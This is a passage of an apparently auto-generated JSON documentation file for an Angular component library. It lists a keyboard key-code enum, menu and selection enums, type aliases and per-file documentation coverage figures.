                    "name": "Key",
                    "childs": [
                        {
                            "name": "Backspace",
                            "value": "8"
                        },
                        {
                            "name": "Tab",
                            "value": "9"
                        },
                        {
                            "name": "Enter",
                            "value": "13"
                        },
                        {
                            "name": "Shift",
                            "value": "16"
                        },
                        {
                            "name": "Ctrl",
                            "value": "17"
                        },
                        {
                            "name": "Alt",
                            "value": "18"
                        },
                        {
                            "name": "PauseBreak",
                            "value": "19"
                        },
                        {
                            "name": "CapsLock",
                            "value": "20"
                        },
                        {
                            "name": "Escape",
                            "value": "27"
                        },
                        {
                            "name": "Space",
                            "value": "32"
                        },
                        {
                            "name": "PageUp",
                            "value": "33"
                        },
                        {
                            "name": "PageDown",
                            "value": "34"
                        },
                        {
                            "name": "End",
                            "value": "35"
                        },
                        {
                            "name": "Home",
                            "value": "36"
                        },
                        {
                            "name": "LeftArrow",
                            "value": "37"
                        },
                        {
                            "name": "UpArrow",
                            "value": "38"
                        },
                        {
                            "name": "RightArrow",
                            "value": "39"
                        },
                        {
                            "name": "DownArrow",
                            "value": "40"
                        },
                        {
                            "name": "Insert",
                            "value": "45"
                        },
                        {
                            "name": "Delete",
                            "value": "46"
                        },
                        {
                            "name": "Zero",
                            "value": "48"
                        },
                        {
                            "name": "ClosedParen",
                            "value": "Zero"
                        },
                        {
                            "name": "One",
                            "value": "49"
                        },
                        {
                            "name": "ExclamationMark",
                            "value": "One"
                        },
                        {
                            "name": "Two",
                            "value": "50"
                        },
                        {
                            "name": "AtSign",
                            "value": "Two"
                        },
                        {
                            "name": "Three",
                            "value": "51"
                        },
                        {
                            "name": "PoundSign",
                            "value": "Three"
                        },
                        {
                            "name": "Hash",
                            "value": "PoundSign"
                        },
                        {
                            "name": "Four",
                            "value": "52"
                        },
                        {
                            "name": "DollarSign",
                            "value": "Four"
                        },
                        {
                            "name": "Five",
                            "value": "53"
                        },
                        {
                            "name": "PercentSign",
                            "value": "Five"
                        },
                        {
                            "name": "Six",
                            "value": "54"
                        },
                        {
                            "name": "Caret",
                            "value": "Six"
                        },
                        {
                            "name": "Hat",
                            "value": "Caret"
                        },
                        {
                            "name": "Seven",
                            "value": "55"
                        },
                        {
                            "name": "Ampersand",
                            "value": "Seven"
                        },
                        {
                            "name": "Eight",
                            "value": "56"
                        },
                        {
                            "name": "Star",
                            "value": "Eight"
                        },
                        {
                            "name": "Asterik",
                            "value": "Star"
                        },
                        {
                            "name": "Nine",
                            "value": "57"
                        },
                        {
                            "name": "OpenParen",
                            "value": "Nine"
                        },
                        {
                            "name": "A",
                            "value": "65"
                        },
                        {
                            "name": "B",
                            "value": "66"
                        },
                        {
                            "name": "C",
                            "value": "67"
                        },
                        {
                            "name": "D",
                            "value": "68"
                        },
                        {
                            "name": "E",
                            "value": "69"
                        },
                        {
                            "name": "F",
                            "value": "70"
                        },
                        {
                            "name": "G",
                            "value": "71"
                        },
                        {
                            "name": "H",
                            "value": "72"
                        },
                        {
                            "name": "I",
                            "value": "73"
                        },
                        {
                            "name": "J",
                            "value": "74"
                        },
                        {
                            "name": "K",
                            "value": "75"
                        },
                        {
                            "name": "L",
                            "value": "76"
                        },
                        {
                            "name": "M",
                            "value": "77"
                        },
                        {
                            "name": "N",
                            "value": "78"
                        },
                        {
                            "name": "O",
                            "value": "79"
                        },
                        {
                            "name": "P",
                            "value": "80"
                        },
                        {
                            "name": "Q",
                            "value": "81"
                        },
                        {
                            "name": "R",
                            "value": "82"
                        },
                        {
                            "name": "S",
                            "value": "83"
                        },
                        {
                            "name": "T",
                            "value": "84"
                        },
                        {
                            "name": "U",
                            "value": "85"
                        },
                        {
                            "name": "V",
                            "value": "86"
                        },
                        {
                            "name": "W",
                            "value": "87"
                        },
                        {
                            "name": "X",
                            "value": "88"
                        },
                        {
                            "name": "Y",
                            "value": "89"
                        },
                        {
                            "name": "Z",
                            "value": "90"
                        },
                        {
                            "name": "LeftWindowKey",
                            "value": "91"
                        },
                        {
                            "name": "RightWindowKey",
                            "value": "92"
                        },
                        {
                            "name": "SelectKey",
                            "value": "93"
                        },
                        {
                            "name": "Numpad0",
                            "value": "96"
                        },
                        {
                            "name": "Numpad1",
                            "value": "97"
                        },
                        {
                            "name": "Numpad2",
                            "value": "98"
                        },
                        {
                            "name": "Numpad3",
                            "value": "99"
                        },
                        {
                            "name": "Numpad4",
                            "value": "100"
                        },
                        {
                            "name": "Numpad5",
                            "value": "101"
                        },
                        {
                            "name": "Numpad6",
                            "value": "102"
                        },
                        {
                            "name": "Numpad7",
                            "value": "103"
                        },
                        {
                            "name": "Numpad8",
                            "value": "104"
                        },
                        {
                            "name": "Numpad9",
                            "value": "105"
                        },
                        {
                            "name": "Multiply",
                            "value": "106"
                        },
                        {
                            "name": "Add",
                            "value": "107"
                        },
                        {
                            "name": "Subtract",
                            "value": "109"
                        },
                        {
                            "name": "DecimalPoint",
                            "value": "110"
                        },
                        {
                            "name": "Divide",
                            "value": "111"
                        },
                        {
                            "name": "F1",
                            "value": "112"
                        },
                        {
                            "name": "F2",
                            "value": "113"
                        },
                        {
                            "name": "F3",
                            "value": "114"
                        },
                        {
                            "name": "F4",
                            "value": "115"
                        },
                        {
                            "name": "F5",
                            "value": "116"
                        },
                        {
                            "name": "F6",
                            "value": "117"
                        },
                        {
                            "name": "F7",
                            "value": "118"
                        },
                        {
                            "name": "F8",
                            "value": "119"
                        },
                        {
                            "name": "F9",
                            "value": "120"
                        },
                        {
                            "name": "F10",
                            "value": "121"
                        },
                        {
                            "name": "F11",
                            "value": "122"
                        },
                        {
                            "name": "F12",
                            "value": "123"
                        },
                        {
                            "name": "NumLock",
                            "value": "144"
                        },
                        {
                            "name": "ScrollLock",
                            "value": "145"
                        },
                        {
                            "name": "SemiColon",
                            "value": "186"
                        },
                        {
                            "name": "Equals",
                            "value": "187"
                        },
                        {
                            "name": "Comma",
                            "value": "188"
                        },
                        {
                            "name": "Dash",
                            "value": "189"
                        },
                        {
                            "name": "Period",
                            "value": "190"
                        },
                        {
                            "name": "UnderScore",
                            "value": "Dash"
                        },
                        {
                            "name": "PlusSign",
                            "value": "Equals"
                        },
                        {
                            "name": "ForwardSlash",
                            "value": "191"
                        },
                        {
                            "name": "Tilde",
                            "value": "192"
                        },
                        {
                            "name": "GraveAccent",
                            "value": "Tilde"
                        },
                        {
                            "name": "OpenBracket",
                            "value": "219"
                        },
                        {
                            "name": "ClosedBracket",
                            "value": "221"
                        },
                        {
                            "name": "Quote",
                            "value": "222"
                        }
                    ],
                    "ctype": "miscellaneous",
                    "subtype": "enum",
                    "description": "<p>MIT License</p>\n<p>Copyright (c) 2017 Nathan Friend</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE. *</p>\n",
                    "file": "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts"
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts": [
                {
                    "name": "MenuItemTypes",
                    "childs": [
                        {
                            "name": "External",
                            "value": "externalLink"
                        },
                        {
                            "name": "ExternalNew",
                            "value": "externalLinkNewWindow"
                        },
                        {
                            "name": "Internal",
                            "value": "internalLink"
                        },
                        {
                            "name": "Navigate",
                            "value": "navigate"
                        }
                    ],
                    "ctype": "miscellaneous",
                    "subtype": "enum",
                    "description": "",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts"
                }
            ],
            "libs/datatable/src/lib/sto-datatable/selection-modes.ts": [
                {
                    "name": "SelectionModes",
                    "childs": [
                        {
                            "name": "Click",
                            "value": "click"
                        },
                        {
                            "name": "DoubleClick",
                            "value": "dblclick"
                        }
                    ],
                    "ctype": "miscellaneous",
                    "subtype": "enum",
                    "description": "",
                    "file": "libs/datatable/src/lib/sto-datatable/selection-modes.ts"
                }
            ]
        },
        "groupedTypeAliases": {
            "libs/datatable/src/lib/sto-datatable/columns.ts": [
                {
                    "name": "ClassFunction",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "function",
                    "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
                    "description": "",
                    "kind": 162
                },
                {
                    "name": "SortFunction",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "function",
                    "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
                    "description": "",
                    "kind": 162
                }
            ],
            "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts": [
                {
                    "name": "Data",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "literal type",
                    "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
                    "description": "",
                    "kind": 165
                }
            ],
            "libs/error-handler/src/lib/error-handler/error-handler.ts": [
                {
                    "name": "Handler",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "function",
                    "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                    "description": "",
                    "kind": 162
                }
            ],
            "libs/datatable/src/lib/sto-datatable/events.ts": [
                {
                    "name": "HeaderContextMenu",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "ContextMenu",
                    "file": "libs/datatable/src/lib/sto-datatable/events.ts",
                    "description": "",
                    "kind": 161
                },
                {
                    "name": "RowContextMenu",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "",
                    "file": "libs/datatable/src/lib/sto-datatable/events.ts",
                    "description": "",
                    "kind": 169
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation.stories.ts": [
                {
                    "name": "Menu",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "literal type",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                    "description": "",
                    "kind": 165
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts": [
                {
                    "name": "Menu",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                    "description": "",
                    "kind": 169
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts": [
                {
                    "name": "PaneType",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "\"left\" | \"right\"",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
                    "description": "",
                    "kind": 168
                }
            ],
            "libs/common/src/lib/theme/theme-saver.service.ts": [
                {
                    "name": "ReturnValue",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "Promise<T> | Observable<T> | T",
                    "file": "libs/common/src/lib/theme/theme-saver.service.ts",
                    "description": "",
                    "kind": 168
                }
            ],
            "libs/datatable/src/lib/sto-datatable/models.ts": [
                {
                    "name": "rowClassFn",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "function",
                    "file": "libs/datatable/src/lib/sto-datatable/models.ts",
                    "description": "",
                    "kind": 162
                }
            ],
            "libs/common/src/lib/theme/models.ts": [
                {
                    "name": "ThemeClassName",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "\"sto-light-theme\" | \"sto-dark-theme\"",
                    "file": "libs/common/src/lib/theme/models.ts",
                    "description": "",
                    "kind": 168
                },
                {
                    "name": "ThemeName",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "\"light\" | \"dark\"",
                    "file": "libs/common/src/lib/theme/models.ts",
                    "description": "",
                    "kind": 168
                },
                {
                    "name": "TypographyClassName",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "\"sto-sm-typography\" | \"sto-m-typography\" | \"sto-l-typography\"",
                    "file": "libs/common/src/lib/theme/models.ts",
                    "description": "",
                    "kind": 168
                },
                {
                    "name": "TypographyName",
                    "ctype": "miscellaneous",
                    "subtype": "typealias",
                    "rawtype": "\"small\" | \"medium\" | \"large\"",
                    "file": "libs/common/src/lib/theme/models.ts",
                    "description": "",
                    "kind": 168
                }
            ]
        }
    },
    "routes": [],
    "coverage": {
        "count": 7,
        "status": "low",
        "files": [
            {
                "filePath": "apps/oilmod-web-e2e/src/support/app.po.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "getGreeting",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "apps/oilmod-web-e2e/src/support/commands.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "Chainable",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "apps/oilmod-web/src/app/app.component.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "primary",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "apps/oilmod-web/src/app/app.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "AppComponent",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "apps/oilmod-web/src/environments/environment.prod.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "environment",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "apps/oilmod-web/src/environments/environment.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "environment",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/preference-manager/active-preference.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "ActivePreferencePipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/preference-manager/preference-manager.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "PreferenceManagerComponent",
                "coveragePercent": 42,
                "coverageCount": "12/28",
                "status": "medium"
            },
            {
                "filePath": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "preferences",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/preference-manager/preference.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Preference",
                "coveragePercent": 66,
                "coverageCount": "6/9",
                "status": "good"
            },
            {
                "filePath": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "ActionFooter",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-action-footer/sto-action-footer.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoActionFooterComponent",
                "coveragePercent": 50,
                "coverageCount": "4/8",
                "status": "medium"
            },
            {
                "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "AppHeader",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "AsTestEnvironment",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "WithUserMenu",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-app-header/sto-app-header.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoAppHeaderComponent",
                "coveragePercent": 42,
                "coverageCount": "6/14",
                "status": "medium"
            },
            {
                "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "Breadcrumb",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "BreadcrumbConfig",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NAVIGATION_HOME_ICON",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoBreadcrumbsComponent",
                "coveragePercent": 31,
                "coverageCount": "5/16",
                "status": "medium"
            },
            {
                "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                "type": "component",
                "linktype": "component",
                "name": "ConfirmDemoComponent",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "dialogConfig",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "ConfirmComponent",
                "coveragePercent": 20,
                "coverageCount": "1/5",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ConfirmService",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "FilterPanel",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/filter.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "FilterList",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoFilterActionsBar",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoFilterPanelComponent",
                "coveragePercent": 42,
                "coverageCount": "8/19",
                "status": "medium"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoFilterActions",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoFilterTableActions",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoFilterTitle",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Accent",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "argTypes",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Danger",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Dismissable",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Primary",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Success",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "UsageWithInput",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Warn",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Warning",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoMessagePanelComponent",
                "coveragePercent": 15,
                "coverageCount": "2/13",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "COLORS",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/common/src/lib/theme/models.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ThemeModel",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/theme/models.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "themes",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/theme/models.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "typography",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ThemeSaverService",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ThemeSaver",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "THEME_SAVER",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/theme/theme.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "StoThemeService",
                "coveragePercent": 0,
                "coverageCount": "0/20",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/test-utils.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "breadCrumbs",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/context-menu.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "ContextMenuDirective",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/date-form-field-click.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "DateFormFieldClickDirective",
                "coveragePercent": 14,
                "coverageCount": "1/7",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/directives.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoContextMenu",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/directives.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoGrid",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/menu-overlay.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "MenuOverlayDirective",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/quick-keys.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "QuickKeysDirective",
                "coveragePercent": 87,
                "coverageCount": "7/8",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoGridColumnDirective",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoGridDirective",
                "coveragePercent": 0,
                "coverageCount": "0/10",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoGridSpacerDirective",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "BreakpointConfig",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "ALL_GRIDS",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "getClass",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-directives/sto-select-text-on-focus.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoSelectTextOnFocusDirective",
                "coveragePercent": 37,
                "coverageCount": "3/8",
